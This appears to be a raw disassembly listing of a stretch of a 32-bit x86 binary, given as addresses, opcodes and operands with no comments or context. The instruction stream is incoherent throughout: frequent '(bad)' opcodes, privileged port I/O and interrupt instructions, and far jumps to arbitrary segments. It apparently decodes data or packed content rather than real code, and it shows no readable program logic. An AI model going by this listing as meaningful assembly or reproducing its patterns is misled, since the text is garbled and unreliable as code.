  40b321:	and    BYTE PTR [ebx+0x5ae33a1b],al
  40b327:	mov    al,0x63
  40b329:	add    DWORD PTR [esi],ecx
  40b32b:	add    al,0x64
  40b32d:	and    ch,BYTE PTR [eax-0x49]
  40b330:	adc    eax,0x7e684ea7
  40b335:	(bad)  
  40b336:	adc    ebp,DWORD PTR [ecx]
  40b338:	mov    edi,0x9c7fdff2
  40b33d:	(bad)  
  40b33e:	push   ds
  40b33f:	jnp    0x40b34d
  40b341:	jo     0x40b391
  40b343:	xlat   BYTE PTR ds:[ebx]
  40b344:	js     0x40b2f2
  40b346:	js     0x40b2f8
  40b348:	pop    ss
  40b349:	shl    DWORD PTR [eiz*8-0x1de1785f],cl
  40b350:	aaa    
  40b351:	jg     0x40b3c0
  40b353:	xchg   DWORD PTR [edi-0xdd0dc1],esp
  40b359:	(bad)  
  40b35a:	mov    edi,0x3caf967a
  40b35f:	cmp    esp,DWORD PTR [edi+edx*8]
  40b362:	fcomi  st,st(5)
  40b364:	push   edi
  40b365:	sbb    edx,DWORD PTR [edx-0x76]
  40b368:	inc    ebx
  40b369:	and    ecx,DWORD PTR [edi+0x3695849d]
  40b36f:	jns    0x40b3f0
  40b371:	inc    eax
  40b372:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b373:	pop    ecx
  40b374:	or     eax,0xbd5420a7
  40b379:	mov    edi,0x4f43e4a0
  40b37e:	in     al,dx
  40b37f:	repz fwait
  40b381:	jmp    eax
  40b383:	or     DWORD PTR [esi+0x79aa36b7],esi
  40b389:	std    
  40b38a:	loop   0x40b403
  40b38c:	mov    ebx,0xfaaf5dea
  40b391:	fsubp  st(5),st
  40b393:	jbe    0x40b35e
  40b395:	repz pushf 
  40b397:	das    
  40b398:	cld    
  40b399:	(bad)  
  40b39a:	xlat   BYTE PTR ds:[ebx]
  40b39b:	mov    ecx,0xe670d578
  40b3a0:	rol    DWORD PTR [edi-0x17],0x74
  40b3a4:	ss push 0xddbc3677
  40b3aa:	iret   
  40b3ab:	sub    dh,0xc7
  40b3ae:	cli    
  40b3af:	sub    al,0xc2
  40b3b1:	lods   eax,DWORD PTR ds:[esi]
  40b3b2:	mov    ecx,0x73cc5d7a
  40b3b7:	mov    edx,0x8884df30
  40b3bc:	cwde   
  40b3bd:	inc    edx
  40b3be:	int    0xef
  40b3c0:	loop   0x40b34d
  40b3c2:	inc    esi
  40b3c3:	iret   
  40b3c4:	push   ss
  40b3c5:	mul    DWORD PTR ds:0xc9aa4375
  40b3cb:	cmp    al,0xfc
  40b3cd:	lea    ecx,[eax-0x4f272278]
  40b3d3:	add    dh,BYTE PTR [eax+0x2c03d6ad]
  40b3d9:	dec    ebx
  40b3da:	mov    esi,DWORD PTR [edi+eax*4+0x308cd274]
  40b3e1:	jg     0x40b3c5
  40b3e3:	stos   BYTE PTR es:[edi],al
  40b3e4:	cli    
  40b3e5:	or     bl,dh
  40b3e7:	and    esi,DWORD PTR [eax*2-0x7bd04ef8]
  40b3ee:	js     0x40b447
  40b3f0:	inc    ebx
  40b3f1:	xor    BYTE PTR [eax+0x3c],0x6
  40b3f5:	mov    al,0x13
  40b3f7:	pushf  
  40b3f8:	xor    eax,0xad1b76ed
  40b3fd:	or     eax,0xb1b39965
  40b402:	xor    eax,esp
  40b404:	in     al,dx
  40b405:	and    esp,DWORD PTR [edi]
  40b407:	jns    0x40b3f9
  40b409:	cmp    eax,0x30da30e7
  40b40e:	lahf   
  40b40f:	into   
  40b410:	cmp    DWORD PTR [eax],edi
  40b412:	fsub   QWORD PTR [edi+0x30]
  40b415:	sbb    al,0x54
  40b417:	cmp    eax,esp
  40b419:	inc    ebp
  40b41a:	push   ecx
  40b41b:	push   esp
  40b41c:	imul   ebx,DWORD PTR [esi-0x3fe0a241],0xffffffdd
  40b423:	mov    dh,0x1d
  40b425:	mov    ch,0xff
  40b427:	pop    esi
  40b428:	jge    0x40b42c
  40b42a:	popf   
  40b42b:	dec    esi
  40b42c:	(bad)  
  40b42d:	or     eax,0x1ad34d57
  40b432:	and    edx,DWORD PTR [esi+0x4a]
  40b435:	xchg   ecx,eax
  40b436:	addr16 sbb edi,edx
  40b439:	scas   al,BYTE PTR es:[edi]
  40b43a:	iret   
  40b43b:	icebp  
  40b43c:	mov    ds:0x2d2ebda1,eax
  40b441:	fwait
  40b442:	add    ch,dl
  40b444:	mov    bl,0x79
  40b446:	test   DWORD PTR [edi+0x52],ebp
  40b449:	pusha  
  40b44a:	jecxz  0x40b489
  40b44c:	out    0x36,eax
  40b44e:	add    BYTE PTR [eax+0xbd36bf5],0xb7
  40b455:	daa    
  40b456:	push   ecx
  40b457:	cmp    edi,ebp
  40b459:	jmp    DWORD PTR [eax-0x4203e01a]
  40b45f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b460:	jns    0x40b446
  40b462:	xchg   ecx,eax
  40b463:	inc    edi
  40b464:	adc    BYTE PTR [edx+0x54],al
  40b467:	icebp  
  40b468:	loope  0x40b4bf
  40b46a:	rcl    DWORD PTR [eax+esi*1-0x2448915d],1
  40b471:	in     eax,0x67
  40b473:	jg     0x40b45b
  40b475:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b476:	jns    0x40b467
  40b478:	jecxz  0x40b489
  40b47a:	icebp  
  40b47b:	scas   eax,DWORD PTR es:[edi]
  40b47c:	jle    0x40b479
  40b47e:	dec    ebx
  40b47f:	cld    
  40b480:	lahf   
  40b481:	push   esi
  40b483:	add    ah,bl
  40b485:	fld    DWORD PTR [ebx-0x28]
  40b488:	(bad)  
  40b48a:	lea    ebx,[edx+0x7a]
  40b48d:	int    0x14
  40b48f:	push   0x3482fa86
  40b494:	cld    
  40b495:	add    DWORD PTR [ebp-0x17279023],edx
  40b49b:	fsubr  st(4),st
  40b49d:	out    dx,eax
  40b49e:	std    
  40b49f:	repnz mov BYTE PTR [edi+0x46ae77de],ah
  40b4a6:	std    
  40b4a7:	jecxz  0x40b4a3
  40b4a9:	(bad)  
  40b4aa:	jmp    0x40b4e8
  40b4ac:	jl     0x40b490
  40b4ae:	cli    
  40b4af:	push   cs
  40b4b0:	jne    0x40b450
  40b4b2:	and    al,0x9
  40b4b4:	pop    edi
  40b4b5:	dec    dl
  40b4b7:	mov    bl,0xfc
  40b4b9:	jmp    0xdc72e3f5
  40b4be:	jp     0x40b452
  40b4c0:	dec    esi
  40b4c1:	outs   dx,DWORD PTR ds:[esi]
  40b4c2:	xchg   ebx,eax
  40b4c3:	jbe    0x40b52c
  40b4c5:	add    al,0xc8
  40b4c7:	lds    ecx,FWORD PTR [ebx+ecx*8]
  40b4ca:	adc    eax,0xfbed8f65
  40b4cf:	mov    eax,0x5337580d
  40b4d4:	dec    ebp
  40b4d5:	fild   WORD PTR gs:[edi-0x61153389]
  40b4dc:	pop    ebx
  40b4dd:	aam    0x15
  40b4df:	ds pushf 
  40b4e1:	mov    ds:0xbaa10209,eax
  40b4e6:	test   al,0x9d
  40b4e8:	push   ebx
  40b4e9:	inc    esp
  40b4ea:	jne    0x40b4d3
  40b4ec:	mov    esi,0xe8801356
  40b4f1:	jp     0x40b521
  40b4f3:	and    BYTE PTR [esi+eax*4+0x14],0xf3
  40b4f8:	mov    ah,BYTE PTR ds:0x2d6b12ac
  40b4fe:	mov    bl,0xd9
  40b500:	ins    BYTE PTR es:[edi],dx
  40b501:	imul   edi,eax,0xcc6210b3
  40b507:	and    ah,dh
  40b509:	cli    
  40b50a:	scas   al,BYTE PTR es:[edi]
  40b50b:	leave  
  40b50c:	jno    0x40b526
  40b50e:	rol    BYTE PTR [esi+0x0],0x0
  40b512:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b513:	adc    ch,BYTE PTR [edi-0x44896dfc]
  40b519:	ret    
  40b51a:	push   edi
  40b51b:	mov    esi,0x9d3a45f2
  40b520:	ds pop ds
  40b522:	(bad)  
  40b523:	lock shl DWORD PTR [edi+eax*1+0x1d],cl
  40b528:	cli    
  40b529:	inc    ebx
  40b52a:	aaa    
  40b52b:	call   0x779eeaf7
  40b530:	cld    
  40b531:	push   ecx
  40b532:	or     BYTE PTR [eax-0x6c],bh
  40b535:	fmul   QWORD PTR [ebp-0xf]
  40b538:	out    dx,eax
  40b539:	aad    0x1f
  40b53b:	adc    BYTE PTR [edi-0x5],bl
  40b53e:	mov    fs,WORD PTR [eax]
  40b540:	mov    al,ds:0x4fffc535
  40b545:	fnstsw WORD PTR [ebx-0x39]
  40b548:	pop    ebx
  40b549:	xchg   esi,eax
  40b54a:	pop    ebp
  40b54b:	cmc    
  40b54c:	popf   
  40b54d:	fistp  QWORD PTR [ebp-0x32]
  40b550:	mov    ecx,0x2f58bef9
  40b555:	aad    0xab
  40b557:	push   edi
  40b558:	mov    eax,ds:0xd5abbabb
  40b55d:	sub    eax,0x2dd5b51a
  40b562:	pop    ecx
  40b563:	adc    ch,BYTE PTR ds:0x63242509
  40b569:	sbb    DWORD PTR [ecx+0x60],ecx
  40b56c:	test   BYTE PTR [edx],al
  40b56e:	add    ch,BYTE PTR [esi+eax*8-0x2]
  40b572:	int3   
  40b573:	mov    ebx,fs
  40b575:	pusha  
  40b576:	iret   
  40b577:	or     al,0x1f
  40b579:	arpl   WORD PTR [edi+0x3481c01c],cx
  40b57f:	mul    BYTE PTR [eax-0x7d]
  40b582:	(bad)  
  40b583:	data16 xchg BYTE PTR [eax-0x40],ah
  40b587:	pusha  
  40b588:	les    eax,FWORD PTR [eax+0x42d90208]
  40b58e:	push   0x9
  40b590:	dec    ecx
  40b591:	je     0x40b54a
  40b593:	cmp    dh,BYTE PTR [edi+0x75]
  40b596:	push   ebp
  40b597:	xchg   DWORD PTR [edx-0x51],ecx
  40b59a:	repnz stos DWORD PTR es:[edi],eax
  40b59c:	jp     0x40b597
  40b59e:	out    0x7b,al
  40b5a0:	ret    0x3f9e
  40b5a3:	jbe    0x40b5dd
  40b5a5:	sti    
  40b5a6:	pushf  
  40b5a7:	jnp    0x40b607
  40b5a9:	push   ebp
  40b5aa:	mov    ebp,0xef1aaa92
  40b5af:	dec    edi
  40b5b0:	mov    ebp,0x7d8727ba
  40b5b5:	neg    BYTE PTR [edx-0x15]
  40b5b8:	mov    bh,0xc2
  40b5ba:	pop    esi
  40b5bb:	sub    ecx,DWORD PTR [ecx+ebp*1]
  40b5be:	xchg   ebp,eax
  40b5bf:	retf   
  40b5c0:	out    dx,al
  40b5c1:	or     eax,0x6c4a9729
  40b5c6:	ins    BYTE PTR es:[edi],dx
  40b5c7:	outs   dx,BYTE PTR ds:[esi]
  40b5c8:	mov    dl,0xb1
  40b5ca:	sub    DWORD PTR [eax+0x63ef57d2],edx
  40b5d0:	push   esp
  40b5d1:	add    dl,dl
  40b5d3:	jmp    0x45:0x3f686435
  40b5da:	test   eax,0x4109a00a
  40b5df:	call   0x6988c6d7
  40b5e4:	and    ch,dh
  40b5e6:	aam    0xbe
  40b5e8:	push   0x79
  40b5ea:	xor    DWORD PTR [edi],0xffffffbd
  40b5ed:	popa   
  40b5ee:	das    
  40b5ef:	ja     0x40b5ce
  40b5f1:	jne    0x40b61a
  40b5f3:	in     eax,0x72
  40b5f5:	(bad)  [esi]
  40b5f7:	or     al,0xf3
  40b5f9:	mov    WORD PTR [ecx+0x57],?
  40b5fc:	stos   BYTE PTR es:[edi],al
  40b5fd:	pop    ecx
  40b5fe:	push   cs
  40b5ff:	ret    
  40b600:	shl    BYTE PTR [edx+0x7ff5ff81],1
  40b606:	stc    
  40b607:	add    BYTE PTR [ebx-0x5],cl
  40b60a:	mov    esi,0xc7fccfc0
  40b60f:	rcr    DWORD PTR [eax+ebx*2-0x43],cl
  40b613:	add    DWORD PTR [edx+ebx*4+0x4f],0xffffff9c
  40b618:	push   ecx
  40b619:	hlt    
  40b61a:	sbb    DWORD PTR [ebp-0x3],esi
  40b61d:	mov    ecx,0xd8737e56
  40b622:	test   al,0xf1
  40b624:	iret   
  40b625:	mul    DWORD PTR [ebx]
  40b627:	fdivp  st(1),st
  40b629:	out    0x21,al
  40b62b:	pop    ds
  40b62c:	cld    
  40b62d:	test   bl,0x94
  40b630:	dec    edx
  40b631:	dec    edx
  40b632:	jp     0x40b619
  40b634:	and    eax,0xfee9158
  40b639:	sub    DWORD PTR [edx+0x31],esi
  40b63c:	stc    
  40b63d:	cld    
  40b63e:	jmp    0x40b635
  40b640:	cmp    ah,BYTE PTR [edi+0xfe59f4f]
  40b646:	(bad)  
  40b647:	jmp    0x40b5dc
  40b649:	adc    ah,ch
  40b64b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b64c:	cmp    DWORD PTR [ecx],esi
  40b64e:	dec    edi
  40b64f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b650:	xor    al,BYTE PTR [ecx+0x32755417]
  40b656:	mov    ds:0x8ac4c7ac,eax
  40b65b:	jge    0x40b61a
  40b65d:	sub    al,0x32
  40b65f:	(bad)  
  40b661:	cmc    
  40b662:	ss xchg ecx,eax
  40b664:	xor    al,BYTE PTR [edi]
  40b666:	xchg   esi,esp
  40b668:	inc    esi
  40b669:	ins    BYTE PTR es:[edi],dx
  40b66a:	add    esp,DWORD PTR [esi+0x18ee451f]
  40b670:	mov    bl,0x20
  40b672:	int    0xf5
  40b674:	jb     0x40b62c
  40b676:	add    DWORD PTR [edx],0x2224907c
  40b67c:	xor    eax,0x152ac5fe
  40b681:	pop    edx
  40b682:	adc    al,0x42
  40b684:	lods   eax,DWORD PTR ds:[esi]
  40b685:	adc    al,0x33
  40b687:	xor    edi,DWORD PTR ds:0xf264636e
  40b68d:	xchg   BYTE PTR [eax-0x2d],al
  40b690:	daa    
  40b691:	outs   dx,BYTE PTR ds:[esi]
  40b692:	xor    eax,0x6f1be720
  40b697:	mov    ds:0x696f8142,eax
  40b69c:	fisttp DWORD PTR ds:0x83b24802
  40b6a2:	iret   
  40b6a3:	mov    bl,0x86
  40b6a5:	xor    ch,ah
  40b6a7:	imul   ebp
  40b6a9:	add    ch,BYTE PTR [edx-0x3ff86b21]
  40b6af:	shl    DWORD PTR [esi],cl
  40b6b1:	sbb    BYTE PTR [ebp+0x3d7d7b67],0xb0
  40b6b8:	jg     0x40b6f1
  40b6ba:	sti    
  40b6bb:	int    0xb2
  40b6bd:	mov    ecx,0x2176c8ff
  40b6c2:	call   0x864db2bc
  40b6c7:	inc    ebx
  40b6c8:	xchg   ebp,eax
  40b6c9:	or     DWORD PTR [eax+0x6f],ebx
  40b6cc:	xchg   ebx,eax
  40b6cd:	push   edx
  40b6ce:	push   edx
  40b6cf:	scas   al,BYTE PTR es:[edi]
  40b6d0:	xchg   esp,eax
  40b6d1:	cmp    DWORD PTR [edi-0x6],edi
  40b6d4:	and    dl,BYTE PTR [edi+0x57]
  40b6d7:	push   ebx
  40b6d8:	leave  
  40b6d9:	and    DWORD PTR [edi+ecx*1+0x40],ebx
  40b6dd:	bound  esi,QWORD PTR [ebx+edi*2+0xd0649dd]
  40b6e4:	push   0xf1965b77
  40b6e9:	imul   ebx,eax,0xf4143c29
  40b6ef:	push   edi
  40b6f0:	test   BYTE PTR [eax],ch
  40b6f2:	adc    DWORD PTR [edx+esi*2],esp
  40b6f5:	enter  0xd8e4,0x80
  40b6f9:	mov    ebx,0x5aa1ef0f
  40b6fe:	lods   eax,DWORD PTR ds:[esi]
  40b6ff:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b701:	iret   
  40b702:	out    0xfb,al
  40b704:	scas   al,BYTE PTR es:[edi]
  40b705:	call   0xce219fe1
  40b70a:	xchg   bx,ax
  40b70c:	dec    edi
  40b70d:	jl     0x40b6fb
  40b70f:	cmp    eax,0x927a581c
  40b714:	lahf   
  40b715:	cld    
  40b716:	ja     0x40b747
  40b718:	lock in al,dx
  40b71a:	dec    ebx
  40b71b:	or     eax,DWORD PTR [ecx+edx*2-0x12de8ca7]
  40b722:	jmp    0xdb0d:0x32633433
  40b729:	shl    BYTE PTR [ebx+0x45],cl
  40b72c:	dec    esp
  40b72d:	rcl    BYTE PTR [ecx+0xb],0xa4
  40b731:	(bad)  
  40b732:	(bad)  
  40b734:	xlat   BYTE PTR ds:[ebx]
  40b735:	clc    
  40b736:	lahf   
  40b737:	jg     0x40b719
  40b739:	xor    eax,0x598d8d8c
  40b73e:	loop   0x40b76f
  40b740:	cmp    ah,0x45
  40b743:	mov    edi,0xa73cd966
  40b748:	dec    edx
  40b749:	in     eax,dx
  40b74a:	cmc    
  40b74b:	sub    BYTE PTR [ebx],ch
  40b74d:	imul   eax,DWORD PTR [ecx],0xfffffff3
  40b750:	jnp    0x40b749
  40b752:	push   ecx
  40b753:	test   eax,0x8caa524c
  40b758:	xchg   ecx,eax
  40b759:	les    eax,FWORD PTR [edx+0x9784ac4]
  40b75f:	push   cs
  40b760:	shl    DWORD PTR [ebp+0x736f47c3],1
  40b766:	xchg   ecx,eax
  40b767:	adc    BYTE PTR [esp+eiz*4+0x59970cb6],0x4a
  40b76f:	push   edx
  40b770:	inc    ebx
  40b771:	lahf   
  40b772:	je     0x40b7a3
  40b774:	mov    ds:0x184e4101,al
  40b779:	mov    DWORD PTR [ebx+eax*8-0x31],edx
  40b77d:	fmul   DWORD PTR [edx]
  40b77f:	or     ah,BYTE PTR [esi+edx*4-0x6c]
  40b783:	sub    esp,esi
  40b785:	aaa    
  40b786:	jg     0x40b732
  40b788:	inc    edx
  40b789:	jb     0x40b753
  40b78b:	fdivr  DWORD PTR [eax-0x69]
  40b78e:	mov    ecx,0x5c061559
  40b793:	add    BYTE PTR fs:[edi],dh
  40b796:	(bad)  
  40b798:	adc    al,0x44
  40b79a:	int    0x31
  40b79c:	clc    
  40b79d:	cmc    
  40b79e:	out    dx,eax
  40b79f:	(bad)  
  40b7a0:	(bad)  
  40b7a1:	out    dx,eax
  40b7a2:	mov    edi,0xb04041a5
  40b7a7:	sti    
  40b7a8:	test   BYTE PTR [eax],ah
  40b7aa:	into   
  40b7ab:	(bad)  
  40b7ac:	xor    al,0xf
  40b7ae:	push   0x6
  40b7b0:	imul   edi,DWORD PTR [esi],0xc0b667c9
  40b7b6:	inc    ebx
  40b7b7:	push   ecx
  40b7b8:	dec    ecx
  40b7b9:	in     al,0x1b
  40b7bb:	cmp    ebp,0x6bf223d7
  40b7c1:	popf   
  40b7c2:	push   ebx
  40b7c3:	mov    ah,0x6c
  40b7c5:	fisub  WORD PTR ds:0x1e7987a3
  40b7cb:	popa   
  40b7cc:	mov    edi,0xee003d6f
  40b7d1:	mov    cl,0xe5
  40b7d3:	jb     0x40b76e
  40b7d5:	stos   DWORD PTR es:[edi],eax
  40b7d6:	stos   DWORD PTR es:[edi],eax
  40b7d7:	pop    ebx
  40b7d8:	mov    ah,0xdb
  40b7da:	sahf   
  40b7db:	call   0xa40c:0x9e842b89
  40b7e2:	mov    cs,WORD PTR [ebx-0x5c]
  40b7e5:	inc    esp
  40b7e6:	and    al,0xd9
  40b7e8:	jmp    0x40b851
  40b7ea:	jne    0x40b86b
  40b7ec:	in     al,dx
  40b7ed:	mov    dl,0xdd
  40b7ef:	dec    esi
  40b7f0:	mov    ds:0x5af40363,al
  40b7f5:	and    dl,BYTE PTR [eax-0x505f33b7]
  40b7fb:	mov    ds:0x72e5cb27,al
  40b800:	popa   
  40b801:	lea    edi,[eax-0x2d]
  40b804:	lahf   
  40b805:	scas   al,BYTE PTR es:[edi]
  40b806:	sub    eax,0x63a2adc3
  40b80b:	je     0x40b7fe
  40b80d:	jb     0x40b7c8
  40b80f:	int3   
  40b810:	mov    ebx,0xf626f5df
  40b815:	cs dec esp
  40b817:	icebp  
  40b818:	mov    ds:0x7c27f13f,eax
  40b81d:	loope  0x40b7f0
  40b81f:	or     DWORD PTR [edx],esp
  40b821:	cmp    DWORD PTR [ecx+0x529999bf],esp
  40b827:	lods   al,BYTE PTR ds:[esi]
  40b828:	and    eax,0x50615164
  40b82d:	xlat   BYTE PTR ds:[ebx]
  40b82e:	cli    
  40b82f:	out    dx,eax
  40b830:	inc    esp
  40b831:	sbb    eax,0xf9b78d4e
  40b836:	sahf   
  40b837:	div    DWORD PTR [edi]
  40b839:	mov    eax,0xb12a35ef
  40b83e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b83f:	dec    ebx
  40b840:	cld    
  40b841:	inc    ebp
  40b842:	mov    edi,0xb6600aae
  40b847:	sbb    DWORD PTR [ebp+0x3e7df7c5],edx
  40b84d:	idiv   ecx
  40b84f:	inc    edi
  40b850:	jns    0x40b84c
  40b852:	stc    
  40b853:	sub    ecx,DWORD PTR [esp+ecx*2-0x23]
  40b857:	dec    ebx
  40b858:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b859:	ss inc ebp
  40b85b:	test   eax,0xd6f80e3c
  40b860:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b861:	xor    BYTE PTR [ecx+0x7d6b5bf6],0x2a
  40b868:	xchg   ebp,eax
  40b869:	push   ebx
  40b86a:	push   cs
  40b86b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b86c:	ja     0x40b7fd
  40b86e:	loopne 0x40b8e7
  40b870:	rep lods eax,DWORD PTR ds:[esi]
  40b872:	frstor [ebx-0xb]
  40b875:	mov    ecx,0x1bca0546
  40b87a:	pop    ss
  40b87b:	in     eax,dx
  40b87c:	mov    eax,ds:0x2bd21de9
  40b881:	mov    ecx,0x622ea787
  40b886:	cmc    
  40b887:	pop    ebp
  40b888:	test   esi,ecx
  40b88a:	push   es
  40b88b:	and    al,0xd3
  40b88d:	lods   al,BYTE PTR ds:[esi]
  40b88e:	inc    eax
  40b88f:	dec    ecx
  40b890:	inc    edx
  40b891:	loopne 0x40b90a
  40b893:	or     DWORD PTR [edx+0x367ec239],eax
  40b899:	mov    eax,ds:0xcf1be98f
  40b89e:	repz scas al,BYTE PTR es:[edi]
  40b8a0:	push   ebp
  40b8a1:	or     eax,0xd0db9b68
  40b8a6:	scas   al,BYTE PTR es:[edi]
  40b8a7:	aas    
  40b8a8:	aas    
  40b8a9:	aaa    
  40b8aa:	xlat   BYTE PTR ds:[ebx]
  40b8ab:	or     al,0x57
  40b8ad:	xchg   esi,eax
  40b8ae:	xor    dl,cl
  40b8b0:	pop    ecx
  40b8b1:	jno    0x40b89f
  40b8b3:	sahf   
  40b8b4:	adc    DWORD PTR ds:0xaae8cd55,edi
  40b8ba:	loopne 0x40b935
  40b8bc:	push   ds
  40b8bd:	mov    ebp,0x489b2f5e
  40b8c2:	les    ebp,FWORD PTR [ecx+0x45]
  40b8c5:	xchg   edx,eax
  40b8c6:	mov    ds:0xdceb5da8,al
  40b8cb:	(bad)  [ebx+edi*4]
  40b8ce:	div    DWORD PTR [ebx]
  40b8d0:	pop    ds
  40b8d1:	arpl   WORD PTR [eax],di
  40b8d3:	sbb    al,0x2a
  40b8d5:	adc    BYTE PTR [ebx],0xc2
  40b8d8:	stc    
  40b8d9:	loopne 0x40b8dd
  40b8db:	aas    
  40b8dc:	lock fldcw WORD PTR [esi+0xd]
  40b8e0:	dec    eax
  40b8e1:	mov    ds:0xf564d98a,al
  40b8e6:	jg     0x40b90d
  40b8e8:	int    0xd2
  40b8ea:	add    dl,BYTE PTR [esi-0x2b668b5a]
  40b8f0:	cmp    ah,BYTE PTR [ecx+0x7f230e91]
  40b8f6:	mov    cl,0x2a
  40b8f8:	and    bl,BYTE PTR [edx-0x5be3153c]
  40b8fe:	and    al,0x49
  40b900:	jl     0x40b8dc
  40b902:	pop    ebp
  40b903:	lahf   
  40b904:	sub    edx,DWORD PTR [edi+0x55]
  40b907:	rcl    BYTE PTR [ecx+ebp*4+0x54],0x2
  40b90c:	shr    BYTE PTR [ecx],cl
  40b90e:	mov    cl,0x26
  40b910:	dec    edx
  40b911:	into   
  40b912:	jge    0x40b982
  40b914:	xlat   BYTE PTR ds:[ebx]
  40b915:	jmp    0x6369:0x4a5cfa6e
  40b91c:	sbb    DWORD PTR [esi-0x3ca16417],edi
  40b922:	dec    edi
  40b923:	(bad)  
  40b924:	fcomp  DWORD PTR [edi-0x20]
  40b927:	mov    ebx,0xb29b62ff
  40b92c:	ja     0x40b947
  40b92e:	lods   al,BYTE PTR ds:[esi]
  40b92f:	shr    DWORD PTR [ebx],1
  40b931:	push   ecx
  40b932:	retf   
  40b933:	sub    DWORD PTR [edi-0x42fdbcbd],esi
  40b939:	pushf  
  40b93a:	cmp    bl,bl
  40b93c:	add    DWORD PTR [ecx-0x219df5b0],ebx
  40b942:	cli    
  40b943:	push   eax
  40b944:	enter  0xbe07,0xfd
  40b948:	mov    al,0x8a
  40b94a:	cwde   
  40b94b:	aam    0xf6
  40b94d:	xchg   esp,esi
  40b94f:	fnsave [ebx-0xc32c3bb]
  40b955:	mov    ecx,0xa9354cdb
  40b95a:	inc    esi
  40b95b:	mov    ds:0xce272bc1,eax
  40b960:	lock fistp QWORD PTR [esi]
  40b963:	(bad)  
  40b964:	cmp    al,0x22
  40b966:	pop    eax
  40b967:	mov    al,ds:0x52a598de
  40b96c:	sbb    eax,0x242af7c7
  40b971:	mov    cl,0xb4
  40b973:	(bad)  
  40b974:	je     0x40b97b
  40b976:	stos   DWORD PTR es:[edi],eax
  40b977:	fidiv  DWORD PTR gs:[edi-0x22aa4046]
  40b97e:	cmp    eax,0xb0256ebd
  40b983:	fcmovnb st,st(7)
  40b985:	out    0x7c,al
  40b987:	addr16 mov ebx,0x115acc54
  40b98d:	test   eax,0x1e94dcca
  40b992:	lahf   
  40b993:	call   0xf82f3ff2
  40b998:	push   esp
  40b999:	(bad)  
  40b99a:	mov    ecx,0xe7dcfcb3
  40b99f:	xor    bh,BYTE PTR [edi+0x52]
  40b9a2:	push   0xffffffc2
  40b9a4:	(bad)  
  40b9a5:	adc    edx,DWORD PTR [edx-0x2b022a8]
  40b9ab:	inc    ebp
  40b9ac:	xor    al,0xaa
  40b9ae:	adc    DWORD PTR [esi-0x5cece179],ebx
  40b9b4:	in     eax,0xc0
  40b9b6:	cmp    eax,0xeddba3cf
  40b9bb:	fidivr DWORD PTR [ecx+ecx*4]
  40b9be:	mov    ecx,0x814a4b76
  40b9c3:	in     eax,0xdb
  40b9c5:	outs   dx,BYTE PTR ds:[esi]
  40b9c6:	adc    BYTE PTR [eax+0x3],al
  40b9c9:	mov    al,0x11
  40b9cb:	pop    ebx
  40b9cc:	or     BYTE PTR [esi-0x78],0x99
  40b9d0:	jmp    0x772f:0xce9fbe2e
  40b9d7:	push   ecx
  40b9d8:	and    edi,0x1d3a7479
  40b9de:	jmp    0x40b9e9
  40b9e0:	mov    eax,0x1be00d96
  40b9e5:	or     eax,0xce5a77fb
  40b9ea:	adc    BYTE PTR ds:0x385b7d28,cl
  40b9f0:	pop    edx
  40b9f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9f2:	push   esp
  40b9f3:	test   BYTE PTR [esi],0x35
  40b9f6:	or     eax,0x25c64438
  40b9fb:	or     BYTE PTR [ecx+eax*2-0x56c5ba37],dl
  40ba02:	fs iret 
  40ba04:	pop    ebx
  40ba05:	std    
  40ba06:	mov    cl,0x56
  40ba08:	imul   ax,WORD PTR [edx+esi*4],0xffb6
  40ba0d:	add    BYTE PTR [ebp-0x70],dh
  40ba10:	les    esi,FWORD PTR [ebx+0x23c124b2]
  40ba16:	push   cs
  40ba17:	daa    
  40ba18:	jns    0x40ba0e
  40ba1a:	icebp  
  40ba1b:	sar    DWORD PTR [edi+esi*8+0x42765adb],cl
  40ba22:	lea    ebx,[ebx]
  40ba24:	and    DWORD PTR [esi+0x422d0313],esi
  40ba2a:	inc    ebx
  40ba2b:	xchg   BYTE PTR [ecx-0x778bc5e3],ah
  40ba31:	jg     0x40ba2c
  40ba33:	dec    edi
  40ba34:	aas    
  40ba35:	int3   
  40ba36:	int3   
  40ba37:	hlt    
  40ba38:	addr16 clc 
  40ba3a:	(bad)  
  40ba3b:	mov    edi,0xb47e9176
  40ba40:	dec    eax
  40ba41:	push   esi
  40ba42:	jp     0x40baae
  40ba44:	jnp    0x40b9c6
  40ba46:	xchg   ebx,eax
  40ba47:	in     eax,0x27
  40ba49:	test   esi,edi
  40ba4b:	add    al,BYTE PTR [ebx-0x2211f1f4]
  40ba51:	loop   0x40ba02
  40ba53:	jle    0x40ba49
  40ba55:	and    BYTE PTR [ebx-0x4d],dh
  40ba58:	xchg   ebx,eax
  40ba59:	xchg   esi,eax
  40ba5a:	lock scas eax,DWORD PTR es:[edi]
  40ba5c:	lds    ebx,FWORD PTR [eax-0x23]
  40ba5f:	in     eax,dx
  40ba60:	out    0x37,al
  40ba62:	dec    ecx
  40ba63:	adc    al,dh
  40ba65:	mov    edi,0x7cdab569
  40ba6b:	out    0xb3,al
  40ba6d:	(bad)  
  40ba6e:	mov    bl,0xb6
  40ba70:	push   ebp
  40ba71:	popa   
  40ba72:	iret   
  40ba73:	fdivr  QWORD PTR [esi]
  40ba75:	dec    edx
  40ba76:	xchg   ebp,eax
  40ba77:	xor    DWORD PTR [edx-0x5ffd5660],eax
  40ba7d:	mov    WORD PTR [ebx],ss
  40ba7f:	inc    edx
  40ba80:	mov    WORD PTR [esi],?
  40ba82:	out    0x88,al
  40ba84:	pop    ss
  40ba85:	mov    al,ds:0xa120e9b0
  40ba8a:	adc    DWORD PTR [edi+ebx*4-0x7b],edx
  40ba8e:	dec    BYTE PTR [ecx-0x3a]
  40ba91:	add    al,0xe0
  40ba93:	fadd   DWORD PTR [esi-0x30]
  40ba96:	out    dx,eax
  40ba97:	out    dx,al
  40ba98:	dec    eax
  40ba99:	sti    
  40ba9a:	imul   ebx,ebp,0xffffffd8
